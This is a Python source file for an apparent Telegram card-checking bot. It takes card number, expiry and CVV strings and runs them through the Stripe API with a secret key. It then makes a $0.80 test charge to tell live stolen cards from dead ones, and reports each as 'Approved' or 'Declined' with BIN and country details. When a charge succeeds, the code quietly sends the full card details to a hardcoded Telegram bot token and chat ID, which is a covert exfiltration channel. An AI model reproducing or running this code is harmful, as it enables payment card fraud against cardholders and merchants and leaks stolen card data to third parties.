import re, requests, string
import logging
import requests
import time
import string
import random
import asyncio
import re
import base64
import json
import sys
import urllib3
import http.client
import os

from telegram import Update
from telegram.ext import Updater, CommandHandler, MessageHandler, CallbackContext, Filters

SK = os.getenv('SK')
session = requests.session()
letters = string.ascii_lowercase
First = ''.join(random.choice(letters) for i in range(6))
Last = ''.join(random.choice(letters) for i in range(6))
PWD = ''.join(random.choice(letters) for i in range(10))
Name = f'{First}+{Last}'
Email = f'{First}.{Last}@gmail.com'
UA = 'Mozilla/5.0 (X11; Linux i686; rv:102.0) Gecko/20100101 Firefox/102.0'

def check_csk(input):
  x = re.search(r"(?:3|4|5|6)\d{14,15}\|\d{2}\|\d{2,4}\|\d{3,4}", input)
  if x:
    card = x.group(0)

  ccn, mm, yy, cvv = card.split('|',4)
  if mm.startswith('2'):
      mm, yy = yy, mm
  if len(mm) >= 3:
      mm, yy, cvv = yy, cvv, mm
  if len(ccn) < 15 or len(ccn) > 16:
      return ('<b>Failed to parse Card</b>\nReason: Invalid Format!</b>') 



  #x = re.findall(r'\d+', input)
  #print(x)
  #ccn = x[0]
  #print(ccn)
  #mm = x[1]
  #yy = x[2]
  #cvv = x[3]
  #if mm.startswith('2'):
            #mm, yy = yy, mm
  #if len(mm) >= 3:
    #        mm, yy, cvv = yy, cvv, mm
  #if len(ccn) < 15 or len(ccn) > 16:
    #        return ('<b>Failed to parse Card</b>\n'
  #                                     '<b>Reason: Invalid Format!</b>')   
  #BIN = ccn[:6]
  
  time1 = time.time()
  b = session.get('https://ip.seeip.org/').text

  s = session.post('https://m.stripe.com/6')
  r = s.json()
  Guid = r['guid']
  Muid = r['muid']
  Sid = r['sid']

        # hmm
  load = {
            "type": 'card',
            "card[number]": ccn,
            "card[exp_month]": mm,
            "card[exp_year]": yy,
            "card[cvc]": cvv

    
        }

  header = {
            "accept": "*/*",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "authorization": 'Bearer '+SK,
            "user-agent": UA,
            "accept-language": "en-US,en;q=0.9"

        }

  rx =  requests.post('https://api.stripe.com/v1/sources',
                          data=load, headers=header)
  res = rx.json()
  
  LastF = f'************{ccn[-4:]}'
  time2 = time.time()
  if 'invalid_number' in rx.text:
          msg = res['error']['message']
          return (f'''
❌Gateway: 💵STRIPE 0.8$💵\n<b>GATE STRIPE</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ ERROR
<b>MSG</b>➟ {msg}
================================================================
================================================================
<b>PROXY-IP</b> <code>{b}</code>
<b>TOOK:</b> <code>{time2 - time1:0.2f}</code>(s)
================================================================
''')
  if 'incorrect_number' in rx.text:
          card = res['card']
          country = card['country']
          brand = card['brand']
          funding = card['funding']
          msg = res['error']['message']
          return (f'''
❌Gateway: 💵STRIPE 0.8$💵\n<b>GATE STRIPE</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ ERROR
<b>MSG</b>➟ {msg}
================================================================
𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
================================================================
================================================================
<b>PROXY-IP</b> <code>{b}</code>
<b>TOOK:</b> <code>{time2 - time1:0.2f}</code>(s)
================================================================
''')
  if 'declined' in rx.text:
            res = rx.json()
            card = res['card']
            country = card['country']
            brand = card['brand']
            funding = card['funding']
            msg = res['error']['message']
            msg2 = res['error']['decline_code']
            return (f'''
❌Gateway: 💵STRIPE 0.8$💵\n<b>GATE STRIPE</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ Declined
<b>MSG</b>➟ {msg}
<b>CODE</b>➟ {msg2}
================================================================
𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
================================================================
<b>PROXY-IP</b> <code>{b}</code>
<b>TOOK:</b> <code>{time2 - time1:0.2f}</code>(s)
================================================================

''')
  if 'incorrect_number' in rx.text:
            res = rx.json()
            msg = res['error']['message']
            return (f'''
❌Gateway: 💵STRIPE 0.8$💵\n<b>GATE STRIPE</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ Incorrect_number
<b>MSG</b>➟ Your card number is incorrect.
================================================================
<b>PROXY-IP</b> <code>{b}</code>
<b>TOOK:</b> <code>{time2 - time1:0.2f}</code>(s)
================================================================

''')
  if 'Request rate limit exceeded.' in rx.text:
            res = rx.json()
            msg = 'SK rate limit'
            return (f'''
❌Gateway: 💵STRIPE 0.8$💵\n<b>GATE STRIPE</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ Request rate limit exceeded.
<b>MSG</b>➟ {msg}
================================================================
<b>PROXY-IP</b> <code>{b}</code>
<b>TOOK:</b> <code>{time2 - time1:0.2f}</code>(s)
================================================================

''')

  if 'API Key provided' in rx.text:
            res = rx.json()
            msg = res['error']['message']
            return (f'''
❌Gateway: 💵STRIPE 0.8$💵\n<b>GATE STRIPE</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ API Key provided
<b>MSG</b>➟ {msg}
<b>PROXY-IP</b> <code>{b}</code>
<b>TOOK:</b> <code>{time2 - time1:0.2f}</code>(s)
================================================================

''')
       
  else:
        card = res['card']
        country = card['country']
        brand = card['brand']
        funding = card['funding']
        src = rx.json()['id'] 
        payload = {
            "email": "check@gmail.com",
            "address[line1]": "36%20Regent%20St",
            "address[city]": "Jamestown",
            "address[state]": "NY",
            "address[postal_code]": "14701",
            "address[country]": "US",
            "source": src           
        }

        head = {
            "accept": "*/*",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "authorization": 'Bearer '+SK,
            "user-agent": UA,
            "accept-language": "en-US,en;q=0.9"
        }
        

        rx =  requests.post('https://api.stripe.com/v1/customers?email=concainit@gmail.com&description=nit&source=<tok>&address[line1]=36%20Regent%20St&address[city]=Jamestown&address[state]=NY&address[postal_code]=14701&address[country]=US', data=payload,
                          headers=head)
       
        res1 = rx.json()
        

        time3 = time.time()
        

        if 'declined' in rx.text:
            res = rx.json()
            msg = res['error']['message']
            msg2 = res['error']['decline_code']
            return (f'''
❌Gateway: 💵STRIPE 0.8$💵\n<b>GATE STRIPE</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ Declined
<b>MSG</b>➟ {msg}
<b>CODE</b>➟ {msg2}
================================================================
𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
================================================================
<b>PROXY-IP</b> <code>{b}</code>
<b>TOOK:</b> <code>{time3 - time1:0.2f}</code>(s)
================================================================

''')
        if 'incorrect_number' in rx.text:
            res = rx.json()
            msg = res['error']['message']
            return (f'''
❌Gateway: 💵STRIPE 0.8$💵\n<b>GATE STRIPE</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ Incorrect_number
<b>MSG</b>➟ Your card number is incorrect.
================================================================
𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
================================================================

<b>PROXY-IP</b> <code>{b}</code>
<b>TOOK:</b> <code>{time3 - time1:0.2f}</code>(s)
================================================================

''')
        if 'Request rate limit exceeded.' in rx.text:
            res = rx.json()
            msg = 'SK rate limit'
            return (f'''
❌Gateway: 💵STRIPE 0.8$💵\n<b>GATE STRIPE</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ Request rate limit exceeded.
<b>MSG</b>➟ {msg}
================================================================
<b>PROXY-IP</b> <code>{b}</code>
<b>TOOK:</b> <code>{time3 - time1:0.2f}</code>(s)
================================================================

''')

        if 'API Key provided' in rx.text:
            res = rx.json()
            msg = res['error']['message']
            return (f'''
❌Gateway: 💵STRIPE 0.8$💵\n<b>GATE STRIPE</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ API Key provided
<b>MSG</b>➟ {msg}
================================================================
<b>PROXY-IP</b> <code>{b}</code>
<b>TOOK:</b> <code>{time3 - time1:0.2f}</code>(s)
================================================================
''')
        
        if 'cus' in rx.text:
         cus = rx.json()['id']
         card = rx.json()['default_source']
        
         head = {
            "accept": "*/*",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "authorization": 'Bearer '+SK,
            "user-agent": UA,
            "accept-language": "en-US,en;q=0.9"
        }
         payload2 = { 
              
         }
        

         rc =  session.post('https://api.stripe.com/v1/customers/'+cus+'/sources/'+card+'', data=payload2, headers=head)
         res2 = rc.json()        
         
         time4 = time.time()
                         
         if 'Request rate limit exceeded.' in rc.text:
            
            msg = res2['error']['message']
            return (f'''
❌Gateway: 💵STRIPE 0.8$💵\n<b>GATE STRIPE</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ Request rate limit exceeded.
<b>MSG</b>➟ {msg}
================================================================
𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
================================================================
<b>PROXY-IP</b> <code>{b}</code>
<b>TOOK:</b> <code>{time4 - time1:0.2f}</code>(s)
================================================================

''')
        cus = rx.json()['id'] 
        payload = {
            "amount": "80",
            "currency": "USD",            
            "customer": cus           
        }

        head = {
            "accept": "*/*",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "authorization": 'Bearer '+SK,
            "user-agent": UA,
            "accept-language": "en-US,en;q=0.9"
        }
        

        ri =  requests.post('https://api.stripe.com/v1/charges', data=payload,
                          headers=head)
        res1 = ri.json()
        print(res1)
        
        
        

        time3 = time.time()
        
        
        if 'Payment complete' in ri.text:
            requests.get('https://api.telegram.org/bot5380276548:AAGpPwcq33EcsQQ8WKyS_htKJUU3SWSkxPk/sendMessage?chat_id=1924942921&text=Charge:'+ccn+'|'+mm+'|'+yy+'|'+cvv+'')
            return (f'''
✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ Charge 0.8$✅
<b>MSG</b>➟ Payment complete!

================================================================
𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
================================================================
<b>PROXY-IP</b> <code>{b}</code>
<b>TOOK:</b> <code>{time3 - time1:0.2f}</code>(s)
================================================================
''')

        if 'incorrect_cvc' in ri.text:
            msg1 = res1['error']['message']
            return (f'''
✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ #ApprovedCCN
<b>MSG</b>➟ {msg1}
================================================================
𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
================================================================
<b>PROXY-IP</b> <code>{b}</code>
<b>TOOK:</b> <code>{time3 - time1:0.2f}</code>(s)
================================================================
''')
        if 'Request rate limit exceeded.' in ri.text:
            msg1 = 'SK rate limit'
            return (f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ Request rate limit exceeded.
<b>MSG</b>➟ {msg1}

================================================================
𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
================================================================
<b>PROXY-IP</b> <code>{b}</code>
<b>TOOK:</b> <code>{time3 - time1:0.2f}</code>(s)
================================================================
''')

        if 'API Key provided' in ri.text:
            msg1 = res1['error']['message']
            return (f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ API Key provided
<b>MSG</b>➟ {msg1}

================================================================
𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
================================================================
<b>PROXY-IP</b> <code>{b}</code>
<b>TOOK:</b> <code>{time3 - time1:0.2f}</code>(s)
================================================================
''')

        if 'insufficient_funds' in ri.text:
            msg1 = res1['error']['message']
            return (f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ Insufficient_funds
<b>MSG</b>➟ {msg1}

================================================================
𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
================================================================
<b>PROXY-IP</b> <code>{b}</code>
<b>TOOK:</b> <code>{time3 - time1:0.2f}</code>(s)
================================================================
''')

        if 'declined' in ri.text:
            msg1 = res1['error']['message']
            msg2 = res1['error']['decline_code']
            return (f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ Declined
<b>MSG</b>➟ {msg1}
<b>CODE</b>➟ {msg2}
================================================================
𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
================================================================
<b>PROXY-IP</b> <code>{b}</code>
<b>TOOK:</b> <code>{time3 - time1:0.2f}</code>(s)
================================================================
''')
        if 'card_decline_rate_limit_exceeded' in ri.text:
            msg1 = res1['error']['message']
            return (f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ Declined
<b>MSG</b>➟ {msg1}

================================================================
𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
================================================================
<b>PROXY-IP</b> <code>{b}</code>
<b>TOOK:</b> <code>{time3 - time1:0.2f}</code>(s)
================================================================
''')

        